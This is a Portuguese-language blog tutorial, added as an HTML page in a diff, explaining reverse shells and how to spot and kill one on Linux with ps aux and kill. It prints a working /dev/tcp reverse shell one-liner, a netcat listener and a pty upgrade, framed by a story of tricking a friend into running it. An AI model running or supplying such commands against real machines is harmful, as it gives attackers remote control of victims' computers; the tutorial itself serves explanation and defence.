@@ -1,0 +1,150 @@
+<html>
+<head>
+	<title>HackingArt</title>
+
+		<meta name="og:title" property="og:title" content="HackingArt">
+	<meta name="author" content="BlackReaper" />
+	<meta name="robots" content="index,follow">
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+	<link rel="canonical" href="https://blackreapersk.github.io/" />
+	<link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<pre><center><a class='clip' href='./'>  /$$   /$$                     /$$       /$$                      /$$$$$$              /$$    
+| $$  | $$                    | $$      |__/                     /$$__  $$            | $$    
+| $$  | $$  /$$$$$$   /$$$$$$$| $$   /$$ /$$ /$$$$$$$   /$$$$$$ | $$  \ $$  /$$$$$$  /$$$$$$  
+| $$$$$$$$ |____  $$ /$$_____/| $$  /$$/| $$| $$__  $$ /$$__  $$| $$$$$$$$ /$$__  $$|_  $$_/  
+| $$__  $$  /$$$$$$$| $$      | $$$$$$/ | $$| $$  \ $$| $$  \ $$| $$__  $$| $$  \__/  | $$    
+| $$  | $$ /$$__  $$| $$      | $$_  $$ | $$| $$  | $$| $$  | $$| $$  | $$| $$        | $$ /$$
+| $$  | $$|  $$$$$$$|  $$$$$$$| $$ \  $$| $$| $$  | $$|  $$$$$$$| $$  | $$| $$        |  $$$$/
+|__/  |__/ \_______/ \_______/|__/  \__/|__/|__/  |__/ \____  $$|__/  |__/|__/         \___/  
+                                                       /$$  \ $$                              
+                                                      |  $$$$$$/                              
+                                                       \______/                               
+<div class='menu'><font style='color:#81ff52'><b><a href="../artigos">Artigos</a>   <a href="../sobremim.html">Sobre Mim</a>   <a target='_blank' href="https://www.youtube.com/channel/UCnjGTP1yeUo0pLkiO3oxDng">Youtube</a></b></font>      |       <a href='https://github.com/BlackReaperSK' class='eu' target='_blank'>Felipe Sousa</a></div></a></center>
+</pre>
+<div class='mainContainer'>
+
+	<h1 class='title'>Reverse Shells, Oque é? Como funciona?</h1><a class='date'>14/07/2021</a><hr style='clear:both;border:none'/><br><center><img alt='Header' src='https://i2.wp.com/www.andreafortuna.org/wp-content/uploads/2017/07/Reverse-Shell-illustration.png?ssl=1' class='img-post'/></a>
+<br>
+<br>	
+<br>Neste artigo, irei explicar, o que são reverse shells (ou shell reversa), como funcionam e como eu posso utiliza deste método, assim também, explicando algumas coisas sobre o ambiente linux e detalhes.
+<br>
+<br><h1>Reverse Shell | Shell Reversa
+</h1>
+<br>Uma reverse shell, é uma conexão shell (shell pode ser descrito como um código ou programa que pode ser utilizado para se obter código ou executar comandos em um determinado dispositivo, como servidores, smartphones, etc) de volta ao computador do atacante, ao contrario do computador esperar para receber uma shell.
+<br>
+<br>
+<div class='terminal'><div class='terminal-top'><br
+<span class='terminal-icon'>>_</span><span class='terminal-title'></span><span class='dot' style='background-color:#e8534b;'></span><span class='dot' style='background-color:#5ac434;'></span><span class='dot' style='background-color:#f1ab1c;'></span><br></div><div class='terminal-content'>
+<br><a class='ps1'>black@kali</a>:<a class='ps3'>~</a><a class='ps2'>$ nc -lnvp 4444
+</a><br>Listening on 0.0.0.0 4444
+<br>Connection received on 10.10.147.70 4444
+<br>$ python3 -c 'import pty;pty.spawn("/bin/bash");'
+<br>usuario@maquina-$ echo "Reverse Shell!"
+<br></div></div>
+<br>
+<br>Basicamente, quando você executa uma reverse shell na sua maquina, você faz o seu computador dar acesso da sua shell ao atacante, possibilitando-o fazer tudo o que quiser dentro de sua maquina. Geralmente, você pode utiliza desta técnica em situações de RCE (Remote Code Execution), para assim poder ampliar o seu acesso, e fazer o Privesc. Por exemplo, existem dois amigos, João e Pedro. Pedro quer muito ver o que tem dentro de uma pasta do computador de João, mas para isso ele precisa ter acesso ao computador dele, coisa que Pedro não tem. Pedro então, decidiu enviar uma reverse shell para seu amigo João, e ele a executou. Veja abaixo o que ocorreu:
+<br>
+<br>
+<div class='terminal'><div class='terminal-top'><br>
+<span class='terminal-icon'>>_</span><span class='terminal-title'></span><span class='dot' style='background-color:#e8534b;'></span><span class='dot' style='background-color:#5ac434;'></span><span class='dot' style='background-color:#f1ab1c;'></span><br></div><div class='terminal-content'>
+<br><a class='ps1'>joao@ubuntu</a>:<a class='ps3'>~</a><a class='ps2'>$ sh -i >& /dev/tcp/10.0.0.2/4444 0>&1
+<br>
+<br>
+<br></div></div>
+<br>
+<br>
+<div class='terminal'><div class='terminal-top'><br>
+<span class='terminal-icon'>>_</span><span class='terminal-title'></span><span class='dot' style='background-color:#e8534b;'></span><span class='dot' style='background-color:#5ac434;'></span><span class='dot' style='background-color:#f1ab1c;'></span><br></div><div class='terminal-content'>
+<br><a class='ps1'>pedro@pop</a>:<a class='ps3'>~</a><a class='ps2'>$ nc -lnvp 4444
+<br> Listening on 0.0.0.0 4444
+<br> Connection received on 10.0.0.5 4444
+<br> sh$ python3 -c 'import pty; pty.spawn("/bin/bash");'
+<br> joao@ubuntu-$ ls
+<br>
+<br> PastaSecretaDoJoao  Downloads             Games
+<br> apps                       snap                   Público
+<br>
+<br>
+<br></div></div>
+<br>*Atenção, Reverse Shells também podem ocorrer no Windows*
+<br>
+<br>Ops.... parece que João teve o conteudo da sua "PastaSecretaDoJoao" vazado. Como pode-se observar, Pedro enviou uma reverse shell para seu amigo, e após ele executa-la, conseguiu acesso a maquina por meio da conexão reversa, ou seja, o computador de João (10.0.0.5) enviou sua shell para o computador de Pedro (10.0.0.2).
+<br>
+<br>
+<h2>Há um jeito de me progeter mesmo depois de executar?</h2>
+<br>A resposta é sim, existe diversos jeitos de se proteger mesmo após a execução. Neste artigo, irei mostrar duas maneiras.
+
+<br><h3>Desligando o Computador</h3>
+<br>Quando você desliga o seu computador, obviamente você "mata" a shell, encerrando assim a conexão, e o acesso do atacante (A não ser que ele já tenha se utilizado de uma maneira de persistencia), eu não recomendaria este método já que ninguém quer ficar reiniciando computador.
+<br>
+<h3>Utilizando-se do PS AUX</h3>
+<br>O comando ps lista os processos em execução no sistema, para saber se um serviço/app está sendo executado, ou, qual é o PID dele (Indentificador de Processo), você pode utilizar do ps aux + grep. 
+<br>
+<br>Por exemplo:
+<br>
+<br>
+<div class='terminal'><div class='terminal-top'><br>
+<span class='terminal-icon'>>_</span><span class='terminal-title'></span><span class='dot' style='background-color:#e8534b;'></span><span class='dot' style='background-color:#5ac434;'></span><span class='dot' style='background-color:#f1ab1c;'></span><br></div><div class='terminal-content'>
+<br><a class='ps1'>felipe@ubuntu</a>:<a class='ps3'>~</a><a class='ps2'>$ ps aux |grep discord                
+</a><br>felipe      2933  0.9  2.2 5008524 134064 ?      Sl   11:38   2:28 /snap/discord/128/usr/share/discord/Discord --no-sandbox
+felipe      3079  0.0  0.4 389100 29356 ?        S    11:38   0:00 /snap/discord/128/usr/share/discord/Discord --type=zygote --no-zygote-sandbox --no-sandbox
+felipe      3080  0.0  0.4 389100 29276 ?        S    11:38   0:00 /snap/discord/128/usr/share/discord/Discord --type=zygote --no-sandbox
+felipe      3198  2.2  2.1 806348 131324 ?       Sl   11:38   5:45 /snap/discord/128/usr/share/discord/Discord
+<br>
+<br> [...]
+<br></div></div>
+<br>
+<br>E pronto! Temos os PIDs dos processos do App Discord aparecendo na nossa tela. Ok mas, como isso pode ser util falando de reverse shell?
+<br>Simples, você pode ver as sessões de shell abertas no seu computador utilizando-se do comando: ps aux |grep bash
+<br> 
+<br>Exemplo:
+<br>
+<br>
+<div class='terminal'><div class='terminal-top'><br>
+<span class='terminal-icon'>>_</span><span class='terminal-title'></span><span class='dot' style='background-color:#e8534b;'></span><span class='dot' style='background-color:#5ac434;'></span><span class='dot' style='background-color:#f1ab1c;'></span><br></div><div class='terminal-content'>
+<br><a class='ps1'>felipe@ubuntu</a>:<a class='ps3'>~</a><a class='ps2'>$ ps aux |grep bash 
+<br>felipe     14322  0.2  0.0  19748  5340 pts/0    Ss   15:52   0:00 bash
+felipe     14330  0.0  0.0  17656   840 pts/0    S+   15:52   0:00 grep --color=auto bash
+
+<br></div></div>
+<br>
+<br>Como vemos, o terminal me retorna duas sessões com este comando, uma bash que eu utilizo, de PID 14322 (Importante saber o que é PID, e guardar na sua cabeça) e a outra com o grep que acabamos de dar. Utilizando do meu grande amigo, <a href="http://whiteh0xor.space/" target="_blank">WhiteReaper</a>, executei a shell reversa dele para mostrar como posso indentificar uma shell.
+<br>
+<br>
+	<div class='terminal'><div class='terminal-top'><br>
+<span class='terminal-icon'>>_</span><span class='terminal-title'></span><span class='dot' style='background-color:#e8534b;'></span><span class='dot' style='background-color:#5ac434;'></span><span class='dot' style='background-color:#f1ab1c;'></span><br></div><div class='terminal-content'>
+<br><a class='ps1'>felipe@ubuntu</a>:<a class='ps3'>~</a><a class='ps2'>$ ps aux |grep bash
+<br>felipe     15054  0.0  0.0  19748  5332 pts/2    Ss   16:10   0:00 bash
+felipe     15371  0.0  0.1  26228  8212 pts/2    S+   16:14   0:00 python3 -c import pty; pty.spawn("/bin/bash")
+felipe     15372  0.3  0.0  19796  5300 pts/3    Ss+  16:14   0:00 /bin/bash
+felipe     15380  0.0  0.0  17788   904 pts/0    S+   16:14   0:00 grep --color=auto bash
+</a><br></div></div>
+<br>
+<br>Agora vemos que existem multiplas sessões de shell, inclusive uma bem curiosa.
+<br>
+<br>felipe     15371  0.0  0.1  26228  8212 pts/2    S+   16:14   0:00 python3 -c import pty; pty.spawn("/bin/bash")
+<br>
+<br>Aqui, podemos ver o PID da shell do atacante (15371), e o comando que ele está executando (python3 -c import pty; pty.spawn("/bin/bash")), o que fazer agora?
+<br>Agora, precisamos "matar" a shell do atacante, simples, como já temos o PID, podemos utilizar o comando kill para matar o processo.
+<br>
+<br>
+<div class='terminal'><div class='terminal-top'><br>
+<span class='terminal-icon'>>_</span><span class='terminal-title'></span><span class='dot' style='background-color:#e8534b;'></span><span class='dot' style='background-color:#5ac434;'></span><span class='dot' style='background-color:#f1ab1c;'></span><br></div><div class='terminal-content'>
+<br><a class='ps1'>felipe@ubuntu</a>:<a class='ps3'>~</a><a class='ps2'>$ kill 15371
+<br>
+<br>
+<br>felipe     15054  0.0  0.0  19748  5332 pts/2    Ss   16:10   0:00 bash
+<br>felipe     15372  0.3  0.0  19796  5300 pts/3    Ss+  16:14   0:00 /bin/bash
+<br>felipe     15380  0.0  0.0  17788   904 pts/0    S+   16:14   0:00 grep --color=auto bash
+</a><br></div></div>
+<br>
+<br>Pronto, o atacante não tem mais acesso ao nosso computador, ao menos que executemos a shell reversa novamente.
+<br>
+<br></div></div>
+</div>
+<div class='footer'>
+Este texto foi escrito por mim, BlackReaper, baseado no que eu sei, e no que eu li. </a>
+</div>
+</body>
